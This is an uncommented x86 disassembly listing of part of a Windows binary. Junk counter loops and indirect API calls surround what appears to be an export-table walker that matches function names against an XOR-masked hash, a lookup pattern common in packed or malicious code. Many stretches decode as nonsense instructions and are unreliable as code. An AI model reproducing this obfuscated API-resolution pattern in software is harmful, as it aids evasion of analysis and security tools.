  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x433633,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x433663,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x433657,0x0
  410260:	mov    ecx,DWORD PTR ds:0x433657
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x433657,ecx
  41026d:	cmp    DWORD PTR ds:0x433657,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x433657,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x433657
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x433657,ecx
  4102a4:	cmp    DWORD PTR ds:0x433657,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x433623,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x433623
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x433623,ecx
  4102d3:	cmp    DWORD PTR ds:0x433623,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x433623,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x4335eb
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x43362b,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x4335e3,0x433547
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x433633,0x0
  410325:	mov    eax,ds:0x433633
  41032a:	inc    eax
  41032b:	mov    ds:0x433633,eax
  410330:	cmp    DWORD PTR ds:0x433633,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x433633,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x433633
  41035a:	inc    eax
  41035b:	mov    ds:0x433633,eax
  410360:	cmp    DWORD PTR ds:0x433633,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x4335e3
  410379:	sbb    eax,DWORD PTR ds:0x433663
  41037f:	mov    ds:0x4335e3,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x4335ab
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x433567,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x433547,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x433547
  4103ba:	inc    eax
  4103bb:	mov    ds:0x433547,eax
  4103c0:	cmp    DWORD PTR ds:0x433547,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x433547,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x433547,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x433547
  4103f8:	inc    eax
  4103f9:	mov    ds:0x433547,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x433657,0x1e
  41040d:	cmp    DWORD PTR ds:0x433657,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x433657,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x433874
  41042f:	push   0x43355f
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x433657,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x433657
  41044c:	dec    eax
  41044d:	mov    ds:0x433657,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x433657
  41045a:	dec    eax
  41045b:	mov    ds:0x433657,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x433657,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x4335a7,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43359b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x4335e3,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	mov    WORD PTR [edx+0x62],?
  4104bf:	rcr    BYTE PTR [ecx+0x127c7cbe],0x7f
  4104c6:	jl     0x410544
  4104c8:	pop    eax
  4104c9:	ret    0x1fef
  4104cc:	push   ss
  4104cd:	dec    edx
  4104ce:	out    0x4b,eax
  4104d0:	dec    edx
  4104d1:	dec    ebx
  4104d2:	cld    
  4104d3:	popa   
  4104d4:	fsub   QWORD PTR [ebp+0x67]
  4104d7:	or     cl,dh
  4104d9:	mov    dh,0x93
  4104db:	add    DWORD PTR [edx-0x6d5538bd],edi
  4104e1:	(bad)  
  4104e2:	mov    ebp,0x62a51390
  4104e7:	xchg   edi,eax
  4104e8:	lea    ebx,[edi]
  4104ea:	arpl   WORD PTR [ebx-0x6c],di
  4104ed:	je     0x4104e4
  4104ef:	or     al,0x84
  4104f1:	test   DWORD PTR [esi+0x5a],ecx
  4104f4:	jno    0x4104b5
  4104f6:	xchg   ecx,eax
  4104f7:	scas   al,BYTE PTR es:[edi]
  4104f8:	leave  
  4104f9:	mov    esi,0x5ad79163
  4104fe:	add    al,0x78
  410500:	xor    edi,DWORD PTR [ecx+0x20]
  410503:	loope  0x41056c
  410505:	pop    ds
  410506:	ror    DWORD PTR [edx+0xf2f5f0d],1
  41050c:	not    BYTE PTR [eax-0x53ca7c2d]
  410512:	(bad)  
  410513:	fmul   QWORD PTR [ebp-0x23fd0cd7]
  410519:	neg    DWORD PTR [edx]
  41051b:	jno    0x41054c
  41051d:	sahf   
  41051e:	daa    
  41051f:	inc    esi
  410520:	icebp  
  410521:	mov    bl,0x41
  410523:	es ret 0xf784
  410527:	popf   
  410528:	mov    esi,0x92129b62
  41052d:	push   edx
  41052e:	mov    dh,0xfb
  410530:	in     eax,dx
  410531:	or     bp,dx
  410534:	push   ss
  410535:	mov    ?,WORD PTR ds:0x788c9d66
  41053b:	(bad)  
  41053c:	cmp    eax,0xe0e3091
  410541:	mov    bh,0xe7
  410543:	xor    eax,0x2b03321f
  410548:	lds    eax,FWORD PTR [esp+edi*4-0x13]
  41054c:	xor    bh,BYTE PTR [eax+0x69]
  41054f:	pop    ss
  410550:	aad    0xe3
  410552:	xor    al,0x13
  410554:	and    al,0xb3
  410556:	mov    bh,0xa7
  410558:	sbb    al,al
  41055a:	jl     0x410577
  41055c:	mov    al,0x81
  41055e:	and    dh,BYTE PTR [ecx+0x5a]
  410561:	mov    esi,0x41ac9153
  410566:	xchg   ebx,eax
  410567:	imul   edi,DWORD PTR [edi-0x7],0xffffffc1
  41056b:	mov    edx,0xd195fafd
  410570:	and    DWORD PTR [ebp-0x7cb020e7],ebp
  410576:	ss in  al,dx
  410578:	pop    ebp
  410579:	daa    
  41057a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41057b:	add    cl,0xb8
  41057e:	cmp    DWORD PTR [ebx+0x4861c9fd],esi
  410584:	push   edx
  410585:	mov    edi,DWORD PTR [eax+esi*2+0x46a243b9]
  41058c:	loopne 0x4105da
  41058e:	test   DWORD PTR ss:[esi],0x6c0f9c0c
  410595:	mov    WORD PTR [esi],ss
  410597:	jle    0x41055c
  410599:	sub    ch,BYTE PTR [ebx+0x5e670c2b]
  41059f:	pop    edx
  4105a0:	and    DWORD PTR [esi-0x60],edi
  4105a3:	push   esp
  4105a4:	add    al,0xf1
  4105a6:	test   al,0xf
  4105a8:	fs out 0xf,al
  4105ab:	sbb    eax,DWORD PTR [ecx+0xe8b6728]
  4105b1:	jmp    0xce7a692b
  4105b6:	adc    DWORD PTR [ecx-0x7a],ebp
  4105b9:	es pop ss
  4105bb:	jg     0x410594
  4105bd:	ds loopne 0x410594
  4105c0:	adc    BYTE PTR [edi+0x247f3a43],ch
  4105c6:	add    BYTE PTR [ebx],dh
  4105c8:	scas   al,BYTE PTR es:[edi]
  4105c9:	in     eax,dx
  4105ca:	outs   dx,BYTE PTR ds:[esi]
  4105cb:	repnz push esi
  4105cd:	fcmovb st,st(6)
  4105cf:	xor    al,0x8c
  4105d1:	hlt    
  4105d2:	inc    esi
  4105d3:	pop    ecx
  4105d4:	div    DWORD PTR [ebx-0xc0879cd]
  4105da:	mov    ecx,0x8e583359
  4105df:	bound  ebp,QWORD PTR [esi-0x6e41f375]
  4105e5:	inc    edx
  4105e6:	mov    eax,DWORD PTR [ebp-0x4]
  4105e9:	sbb    DWORD PTR ds:0x4335d7,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x43354f,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x43362f
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x43362f,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x4335df,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x410624
  410648:	jne    0x410600
  41064a:	inc    esp
  41064b:	mov    edi,0x127c7cb9
  410650:	jg     0x4106ce
  410652:	jl     0x4106b1
  410654:	mov    ds,WORD PTR [ecx]
  410656:	icebp  
  410657:	int3   
  410658:	or     al,0x32
  41065a:	jmp    0xee3f376f
  41065f:	ss pop es
  410661:	retf   0x256b
  410664:	jbe    0x41061e
  410666:	shr    BYTE PTR [edi],cl
  410668:	call   0x39d2f1a6
  41066d:	sub    BYTE PTR [ebp+0x75],dh
  410670:	ja     0x410631
  410672:	mov    ds:0x85aabb8f,eax
  410677:	jo     0x410610
  410679:	mov    edx,0x25e13f7e
  41067e:	aad    0x94
  410680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410681:	and    eax,0xfcb251d3
  410686:	adc    DWORD PTR [bx],ecx
  410689:	dec    edi
  41068a:	and    BYTE PTR ds:0x3426e31e,bl
  410690:	jecxz  0x410690
  410692:	xor    BYTE PTR [edi],ch
  410694:	loope  0x410628
  410696:	sbb    ebp,DWORD PTR [ebx-0x29dffdbc]
  41069c:	cmp    al,0x6c
  41069e:	sbb    ecx,DWORD PTR [esp+eiz*4-0x5d]
  4106a2:	cmp    DWORD PTR [ecx+ebx*1+0x74],0xffffffce
  4106a7:	aad    0x21
  4106a9:	mov    ebx,0xe7f7ef37
  4106ae:	sbb    eax,0x3c881ecd
  4106b3:	clc    
  4106b4:	sbb    eax,0x54bf48f9
  4106b9:	ins    DWORD PTR es:[edi],dx
  4106ba:	lods   eax,DWORD PTR ds:[esi]
  4106bb:	icebp  
  4106bc:	test   ebx,esi
  4106be:	or     ebp,DWORD PTR [eax-0x459c29b2]
  4106c4:	fstp   TBYTE PTR [ecx+0x79]
  4106c7:	stos   BYTE PTR es:[edi],al
  4106c8:	aas    
  4106c9:	add    al,0xd2
  4106cb:	in     eax,0x9c
  4106cd:	scas   al,BYTE PTR es:[edi]
  4106ce:	shl    BYTE PTR [eax+0x486232a2],cl
  4106d4:	sbb    DWORD PTR [ebx-0x18],edi
  4106d7:	mov    esi,0x51786b10
  4106dc:	scas   eax,DWORD PTR es:[edi]
  4106dd:	mov    al,ds:0x9ff663e7
  4106e2:	xor    BYTE PTR [edx+0x40],cl
  4106e5:	bnd jmp 0xa3821c7a
  4106eb:	out    0x50,al
  4106ed:	jnp    0x41072e
  4106ef:	dec    edx
  4106f0:	inc    esp
  4106f1:	outs   dx,BYTE PTR ds:[esi]
  4106f2:	pushf  
  4106f3:	sub    edx,esi
  4106f5:	test   eax,0x1ac004ea
  4106fa:	test   eax,0x651844ce
  4106ff:	ins    DWORD PTR es:[edi],dx
  410700:	or     eax,0xbbcfe8c5
  410705:	inc    ebp
  410706:	test   ebx,ebx
  410708:	mov    ebp,0x43f84059
  41070d:	leave  
  41070e:	pop    ss
  41070f:	aam    0x80
  410711:	jo     0x41072d
  410713:	xchg   ecx,eax
  410714:	aam    0x94
  410716:	dec    esp
  410717:	jge    0x4106ba
  410719:	cld    
  41071a:	scas   al,BYTE PTR es:[edi]
  41071b:	sub    ebx,DWORD PTR [ebx-0x70]
  41071e:	mov    ch,0xa2
  410720:	dec    ecx
  410721:	adc    eax,0xa556d928
  410726:	imul   ecx,DWORD PTR [esi-0x38],0x8e8fa32e
  41072d:	xor    DWORD PTR ds:0xe78bea2b,edi
  410733:	loopne 0x4106ed
  410735:	jmp    0x12824748
  41073a:	pop    eax
  41073b:	out    dx,al
  41073c:	inc    ebx
  41073d:	push   ds
  41073e:	mov    esp,DWORD PTR fs:[esi-0x52]
  410742:	outs   dx,DWORD PTR ds:[esi]
  410743:	xchg   ebx,eax
  410744:	inc    esp
  410745:	or     DWORD PTR [edi-0xa],ebp
  410748:	adc    al,0xfc
  41074a:	add    ebx,DWORD PTR [edi]
  41074c:	imul   ebx,DWORD PTR [edx-0x1b],0x73
  410750:	out    0x19,al
  410752:	and    eax,DWORD PTR [esi]
  410754:	aaa    
  410755:	xor    DWORD PTR [edx+0x1416ac02],edx
  41075b:	cmp    eax,0x911c4704
  410760:	dec    ebx
  410761:	aaa    
  410762:	mov    ebx,DWORD PTR [edi-0xd]
  410765:	jp     0x4107cf
  410767:	ror    ebx,cl
  410769:	leave  
  41076a:	xchg   BYTE PTR [ecx-0x44b276a3],dl
  410770:	cmc    
  410771:	mov    ecx,DWORD PTR [ebp-0x14]
  410774:	add    DWORD PTR ds:0x433567,0x3989
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x433563,0x43354f
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x4335a3,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x433663
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0x2cfac5a,eax
  4107e5:	xchg   DWORD PTR [ebp+ebx*2+0x127c7cb8],esi
  4107ec:	jg     0x41086a
  4107ee:	jl     0x410803
  4107f0:	outs   dx,BYTE PTR ds:[esi]
  4107f1:	mov    eax,0x2130fe15
  4107f6:	mov    esp,edi
  4107f8:	lahf   
  4107f9:	pusha  
  4107fa:	mov    eax,0x2fd645dc
  4107ff:	cdq    
  410800:	fisubr DWORD PTR [ebx-0x453b4d63]
  410806:	push   ss
  410807:	mov    dl,bl
  410809:	fdivr  QWORD PTR [eax+eiz*4+0x5cca2637]
  410810:	or     eax,0x1f3c58e0
  410815:	mov    ecx,0x86b123d2
  41081a:	mov    ds:0x992b4ab9,al
  41081f:	sbb    BYTE PTR [edx+0x26],cl
  410822:	or     BYTE PTR [edi-0x57c1eada],dl
  410828:	cmc    
  410829:	cwde   
  41082a:	mov    edx,0x22e5136e
  41082f:	jl     0x410859
  410831:	lods   eax,DWORD PTR ds:[esi]
  410832:	xor    bl,BYTE PTR [ebx]
  410834:	aam    0xe2
  410836:	adc    DWORD PTR [eax+0x77],0x53
  41083a:	xchg   esi,eax
  41083b:	lods   eax,DWORD PTR ds:[esi]
  41083c:	fcmovnb st,st(0)
  41083e:	xchg   edi,eax
  41083f:	jmp    0x9bc2ab58
  410844:	sub    cl,BYTE PTR [ebx+ebp*4]
  410847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410848:	inc    ebx
  410849:	cmp    eax,DWORD PTR [ebp-0x7eed0b21]
  41084f:	aas    
  410850:	jo     0x4107e7
  410852:	mov    al,ds:0x9bd5339b
  410857:	pop    esp
  410858:	push   eax
  410859:	dec    edx
  41085a:	mov    edi,0x4f4b7205
  41085f:	sub    DWORD PTR ds:0xae849052,ebp
  410865:	add    DWORD PTR [ebx+0x58dc31f7],esi
  41086b:	adc    eax,DWORD PTR [edi+0x773ae8a6]
  410871:	lahf   
  410872:	nop
  410873:	clc    
  410874:	inc    eax
  410875:	call   0x97f427a2
  41087a:	push   esi
  41087b:	push   ecx
  41087c:	jmp    0x2bce0ac3
  410881:	push   ds
  410882:	and    ebp,ebp
  410884:	pop    es
  410885:	xor    eax,0x8a474671
  41088a:	scas   al,BYTE PTR es:[edi]
  41088b:	in     eax,dx
  41088c:	mov    esi,DWORD PTR [ecx-0x67]
  41088f:	or     eax,0x8cacac4
  410894:	add    DWORD PTR [edi+edx*8+0x7b4d4576],edx
  41089b:	and    al,BYTE PTR [esi]
  41089d:	jecxz  0x41082c
  41089f:	mov    dh,0xd4
  4108a1:	dec    esp
  4108a2:	and    bh,ch
  4108a4:	sub    BYTE PTR [eax-0x15],bl
  4108a7:	sbb    al,BYTE PTR [eax+0x588e32c5]
  4108ad:	inc    ebx
  4108ae:	jae    0x41084a
  4108b0:	inc    edi
  4108b1:	mov    esi,ebx
  4108b3:	or     ebp,DWORD PTR [edx-0x22b2176d]
  4108b9:	shl    BYTE PTR [ebp+eax*1-0x1c982146],cl
  4108c0:	gs push es
  4108c2:	(bad)  
  4108c4:	arpl   di,di
  4108c6:	xchg   DWORD PTR [eax-0x72],edi
  4108c9:	sti    
  4108ca:	int    0x0
  4108cc:	and    DWORD PTR [edx],eax
  4108ce:	xchg   edx,eax
  4108cf:	fiadd  DWORD PTR [ebx-0x132282e8]
  4108d5:	cmp    ebp,DWORD PTR [edi]
  4108d7:	xor    DWORD PTR [ecx-0x5a],edi
  4108da:	mov    esi,0xdfa4aa03
  4108df:	or     bh,BYTE PTR [esi+0x13725ae4]
  4108e5:	rol    BYTE PTR gs:[eax],cl
  4108e8:	push   ds
  4108e9:	js     0x410922
  4108eb:	jp     0x4108b0
  4108ed:	xor    cl,ah
  4108ef:	xchg   esi,eax
  4108f0:	pop    eax
  4108f1:	je     0x4108e1
  4108f3:	repz gs icebp 
  4108f6:	sub    eax,0xcb70463e
  4108fb:	pop    es
  4108fc:	rcl    esi,cl
  4108fe:	push   cs
  4108ff:	loopne 0x4108da
  410901:	jmp    0xedc015a9
  410906:	add    al,0x65
  410908:	push   edx
  410909:	sub    DWORD PTR [ebp+0x11],ebx
  41090c:	daa    
  41090d:	mov    ecx,DWORD PTR [ebp+0x8]
  410910:	add    ecx,DWORD PTR [eax+edi*4]
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [ebx],dl
  41099e:	pop    esi
  41099f:	cvtdq2ps xmm6,XMMWORD PTR [ebx-0x45]
  4109a3:	jl     0x410a21
  4109a5:	adc    bh,BYTE PTR [edi+0x7c]
  4109a8:	jl     0x4109d3
  4109aa:	cld    
  4109ab:	in     al,0x66
  4109ad:	out    0xfe,eax
  4109af:	cmp    DWORD PTR [esi+0x75],ebp
  4109b2:	es inc ebp
  4109b4:	sub    eax,0x8ced0c27
  4109b9:	fimul  DWORD PTR [edx+0x68]
  4109bc:	mov    edi,0x3c7f7e05
  4109c1:	dec    ecx
  4109c2:	mov    esp,0x2566bb2a
  4109c7:	push   ds
  4109c8:	call   0x5c83:0xf9ffae0e
  4109cf:	xor    BYTE PTR [edx],bh
  4109d1:	adc    al,0x50
  4109d3:	(bad)  
  4109d4:	out    dx,al
  4109d5:	cmp    DWORD PTR [edi+eax*1-0x22],esi
  4109d9:	out    dx,al
  4109da:	in     eax,dx
  4109db:	or     BYTE PTR [esi],ah
  4109dd:	pop    esi
  4109de:	loopne 0x4109bf
  4109e0:	js     0x410a41
  4109e2:	and    ebp,DWORD PTR [ecx+0x8b2cc87]
  4109e8:	mov    ebx,0x2ddfb522
  4109ed:	out    0x3e,al
  4109ef:	jo     0x410994
  4109f1:	hlt    
  4109f2:	dec    eax
  4109f3:	pop    esi
  4109f4:	pop    eax
  4109f5:	mov    esp,0x962c2de
  4109fa:	xor    ebx,edx
  4109fc:	fiadd  DWORD PTR [eax+eax*2+0x1]
  410a00:	mov    DWORD PTR [edx+0x8c227cf],ebx
  410a06:	leave  
  410a07:	repz pop ecx
  410a09:	dec    ebx
  410a0a:	or     DWORD PTR fs:[ebx+0x4c],ebx
  410a0e:	inc    edi
  410a0f:	sub    al,0xe7
  410a11:	neg    DWORD PTR [edi]
  410a13:	xor    ebx,ebx
  410a15:	mov    edx,edx
  410a17:	stos   DWORD PTR es:[edi],eax
  410a18:	jo     0x4109b4
  410a1a:	rol    DWORD PTR [edi],1
  410a1c:	lods   eax,DWORD PTR ds:[esi]
  410a1d:	mov    WORD PTR [eax],gs
  410a1f:	mov    bl,0xbd
  410a21:	mov    esi,0xaaeff5f9
  410a26:	push   0xf417900a
  410a2b:	push   edi
  410a2c:	inc    ecx
  410a2d:	bswap  ebp
  410a2f:	(bad)  
  410a30:	cwde   
  410a31:	jae    0x410a63
  410a33:	dec    esp
  410a34:	dec    esp
  410a35:	mov    ah,BYTE PTR [edi+0x4f]
  410a38:	xchg   DWORD PTR [eax-0xe],esp
  410a3b:	shl    DWORD PTR [ecx+esi*4],cl
  410a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a3f:	sbb    eax,0x93795bd9
  410a44:	push   esi
  410a45:	lods   eax,DWORD PTR ds:[esi]
  410a46:	arpl   WORD PTR [ebp+esi*1+0x5e],ax
  410a4a:	adc    DWORD PTR [ebp-0x19],0xa
  410a4e:	sar    DWORD PTR [ecx+0x4c],0xe4
  410a52:	sub    al,0x80
  410a54:	mov    edi,0x2694d90f
  410a59:	sub    eax,0x8f946aee
  410a5e:	leave  
  410a5f:	dec    edx
  410a60:	push   es
  410a61:	jnp    0x410abc
  410a63:	ins    BYTE PTR es:[edi],dx
  410a64:	out    0x41,eax
  410a66:	adc    al,cl
  410a68:	repnz cmp bh,BYTE PTR [eax+0x66]
  410a6c:	push   cs
  410a6d:	cmp    bh,BYTE PTR [eax+0x1fb94be2]
  410a73:	lds    edi,FWORD PTR [esi+ecx*8+0x0]
  410a77:	xchg   esi,eax
  410a78:	inc    ecx
  410a79:	pop    edx
  410a7a:	add    eax,0x16626c3c
  410a7f:	push   es
  410a80:	xor    ah,cl
  410a82:	in     al,0x89
  410a84:	cmp    bl,dh
  410a86:	or     dl,BYTE PTR [esi-0x66]
  410a89:	adc    esi,DWORD PTR [eax+0x232c7c1f]
  410a8f:	xchg   DWORD PTR [edx+ecx*1-0x2c6cab54],ecx
  410a96:	(bad)  
  410a98:	sti    
  410a99:	fidiv  WORD PTR [edi-0xe]
  410a9c:	ror    DWORD PTR [eax+0x22337f4f],cl
  410aa2:	xchg   ebp,eax
  410aa3:	not    BYTE PTR [eax-0x7dee2750]
  410aa9:	or     BYTE PTR [eax+0x3a],0x9b
  410aad:	adc    BYTE PTR [ebx],ah
  410aaf:	jmp    0x1236:0xf4a6b248
  410ab6:	pop    ds
  410ab7:	js     0x694b6be2
  410abd:	(bad)  
  410abe:	add    al,0x4e
  410ac0:	or     ah,BYTE PTR [ebx+0x2055eb7f]
  410ac6:	push   edi
  410ac7:	add    eax,DWORD PTR [ebp+0x8]
  410aca:	mov    DWORD PTR [ebp-0x10],eax
  410acd:	mov    eax,DWORD PTR [ebp-0x1c]
  410ad0:	test   eax,eax
  410ad2:	je     0x41108e
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	fdivr  QWORD PTR [ebx]
  410af2:	loop   0x410acf
  410af4:	pop    ebx
  410af5:	adc    DWORD PTR [ebp+0x7c],eax
  410af8:	jl     0x410b0c
  410afa:	jg     0x410b78
  410afc:	jl     0x410a80
  410afe:	cmc    
  410aff:	nop
  410b00:	fisubr DWORD PTR [edx+0x7f6dfd87]
  410b06:	test   DWORD PTR [esi+eiz*2-0x10cf6bf3],edi
  410b0d:	lock pushf 
  410b0f:	mov    dh,0x49
  410b11:	push   esi
  410b12:	retf   
  410b13:	push   edx
  410b14:	loope  0x410b1c
  410b16:	(bad)  
  410b17:	(bad)  
  410b18:	jmp    0x410ae8
  410b1a:	outs   dx,BYTE PTR ds:[esi]
  410b1b:	push   cs
  410b1c:	mov    eax,ds:0x6b90002d
  410b21:	sti    
  410b22:	jo     0x410b08
  410b24:	mov    ch,0x7e
  410b26:	inc    esi
  410b27:	in     al,dx
  410b28:	adc    eax,0x8ab5ef3a
  410b2d:	mov    dh,0xfb
  410b2f:	add    dh,dl
  410b31:	iret   
  410b32:	push   ebx
  410b33:	outs   dx,BYTE PTR ds:[esi]
  410b34:	mov    esi,esp
  410b36:	in     eax,0xe7
  410b38:	sahf   
  410b39:	fistp  WORD PTR [ebx+ebp*4-0x6963d5a7]
  410b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b41:	leave  
  410b42:	es out 0xc7,al
  410b45:	shl    edi,cl
  410b47:	mov    esi,0xf05031b4
  410b4c:	mov    edi,0x40f4c3eb
  410b51:	outs   dx,BYTE PTR ds:[esi]
  410b52:	jne    0x410bd0
  410b54:	cdq    
  410b55:	jne    0x410ba3
  410b57:	ss push ebx
